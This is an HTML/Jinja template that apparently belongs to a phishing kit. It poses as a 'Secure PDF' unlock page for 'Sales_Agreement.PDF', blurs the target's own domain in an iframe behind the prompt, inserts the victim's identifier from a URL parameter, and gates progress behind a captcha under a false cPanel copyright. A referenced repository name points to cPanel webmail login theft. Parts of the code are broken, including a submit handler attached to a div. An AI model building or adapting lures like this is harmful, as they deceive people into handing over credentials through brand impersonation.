<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cofidential Document | Secure PDF Access</title>
    
    <style>
        /* Reset and body setup */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f4f4f4;
        }

        /* Blurred Background (Very Light Blur 2px) */
        <!-- body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            /* Replace 'SAP.png' with your actual image URL or Base64 string */
            background-image: url('https://github.com/brijeshdenm/session-failure-login-webmail-cpanell-cpsess-xcuwidskashhd/blob/main/templates/SAP.PNG');
            background-size: cover;
            background-position: center;
            filter: blur(1.5px); /* Light blur - see lines, not text */
            z-index: -1;
            transform: scale(1.0); /* Prevent blur edges */
        } -->
		#background-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1;
            filter: blur(1.5px) brightness(0.8);
        }

        /* Trigger Button (Using the checkbox label structure) */
        .show-btn {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.7);
            background: #ffffff;
            color: #333;
            padding: 15px 30px;
            border-radius: 50px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            font-weight: bold;
            cursor: pointer;
            z-index: 10;
            transition: transform 0.3s ease;
            border: 2px solid #ff6c2c;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .show-btn:hover {
            transform: translate(-50%, -50%) scale(0.95);
        }

        /* Hide the checkbox */
        #show {
            display: none;
        }

        /* Popup Container (Soft Brief Popup) */
        .container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.7);
            width: 320px;
            background: #ffffff;
            border-radius: 17px;
            box-shadow: 0 15px 60px rgba(0,0,0,0.3);
            z-index: 100;
            opacity: 0;
            visibility: hidden;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            padding: 25px;
            text-align: center;
            box-sizing: border-box;
        }

        /* When checkbox is checked, show popup */
        #show:checked + .show-btn {
            display: none;
        }

        #show:checked ~ .container {
            transform: translate(-50%, -50%) scale(1);
            opacity: 1;
            visibility: visible;
        }

        /* Close Button */
        .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            font-size: 24px;
            font-weight: bold;
            color: #888;
            cursor: pointer;
            line-height: 1;
            transition: color 0.3s;
        }
        
        .close-btn:hover {
            color: #333;
        }

        /* Loading Animation Spinner */
        #loading-spinner {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200px;
        }

        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #ff6c2c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Form Content (Hidden initially) */
        #form-content {
            display: none;
        }

        /* Lock Icon (Adjusted for SVG image) */
        .lock-icon {
            width: 40px;
            height: 40px;
            margin-bottom: 18px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        h1 {
            font-size: 17px;
            margin: 0 0 8px 0;
            color: #333;
        }

        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }

        /* Input Field (Captcha Style) */
        .input-group {
            margin-bottom: 18px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 8px;
            color: #444;
        }

        .input-group input {
            width: 80%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 30px;
            text-align: center;
            font-size: 18px;
            letter-spacing: 8px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #ff6c2c;
        }

        /* Verify Button */
        button {
            width: 80%;
            padding: 15px;
            background: #ff6c2c;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            box-shadow: 0 4px 10px rgba(255, 108, 44, 0.3);
        }

        button:hover {
            background: #e55a1f;
        }

        /* Access Granted section (Initially hidden) */
        #access-granted {
            display: none;
            padding: 20px;
            background: #e8f5e9;
            border-radius: 10px;
            margin-top: 20px;
        }

        #access-granted h3 {
            color: #2e7d32;
            margin: 0 0 10px 0;
        }

        #access-granted a {
            color: #2e7d32;
            font-weight: bold;
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <iframe id="background-iframe" src="https://{{ user_domain }}"></iframe>
	<!-- Checkbox Trigger (Keeps the base HTML structure) -->
    <input type="checkbox" id="show">
    <label for="show" class="show-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/Semi-protection-shackle-no-text.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="lock" style="width: 16px; height: 16px; margin-right: 8px;">
        Access Secure PDF
    </label>

    <!-- Popup Container -->
    <div class="container">
        <label for="show" class="close-btn" title="close">×</label>
        
        <!-- Loading Spinner (Visible initially) -->
        <div id="loading-spinner">
            <div class="spinner"></div>
        </div>

		<!-- Main Content (Hidden until loading finishes) -->
        <div id="form-content" method="POST" action="{{ url_for('captcha_challenge') }}">
            <img class="lock-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/59/Semi-protection-shackle-no-text.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="lock" style="width: 16px; height: 16px; margin: -1 0 -1 0;">
            
            <h1>Sales_Agreement.PDF</h1>
			<p class="email">For: {{ request.args.get('web', 'default') }}</p>
            <p>Enter the 6-digit code to remove security</p>

            <div class="input-group">
                <label for="captcha-input"><h1><img src="data:image/png;base64,{{ img_data }}" alt="CODE" style="max-width: 100%; height: auto;"></h1></label>
                <input type="text" id="captcha-input" maxlength="6" placeholder="••••••">
            </div>
			<input type="hidden" name="web" value="{{ request.args.get('web') }}">

            <button type="submit">Verify & Unlock PDF</button>
			<p style="text-align: center; font-size: 12px;">&copy; 2026 cPanel. All Rights Reserved.</p>

            
        </div>
    </div>

    <script>
        // Add loading animation logic: When the label is clicked, show spinner for 2 seconds, then reveal form
        const showBtn = document.querySelector('.show-btn');
        const checkbox = document.getElementById('show');
        const spinner = document.getElementById('loading-spinner');
        const formContent = document.getElementById('form-content');

        showBtn.addEventListener('click', function(e) {
            // Prevent default checkbox toggle so we can show loading first
            e.preventDefault();
            
            // Show spinner
            spinner.style.display = 'flex';
            formContent.style.display = 'none';

            // After 2 seconds, simulate loading finished and show form
            setTimeout(() => {
                spinner.style.display = 'none';
                formContent.style.display = 'block';
                
                // Now actually trigger the checkbox to show the popup
                checkbox.checked = true;
            }, 1500);
        });

        
		formContent.addEventListener('submit', function(event) {
		
			event.preventDefault();
			const input = document.getElementById('captcha-input');
			const granted = document.getElementById('access-granted');
			const form = this;
			
			if (input.value.length === 6) {
				// Hide the input and button
				document.querySelector('.input-group').style.display = 'none';
				document.querySelector('button').style.display = 'none';
				document.querySelector('p').innerText = "Verification successful.";
				
				// Show access granted
				form.submit();
				
				
				
				// Automatically submit after 0.7 seconds
				setTimeout(() => {
					
					form.submit();
				}, 700);
			} else {
				// Show error message
				alert("Please enter the complete 6-digit code.");
				input.focus();
			}
		});
    </script>
</body>
</html>
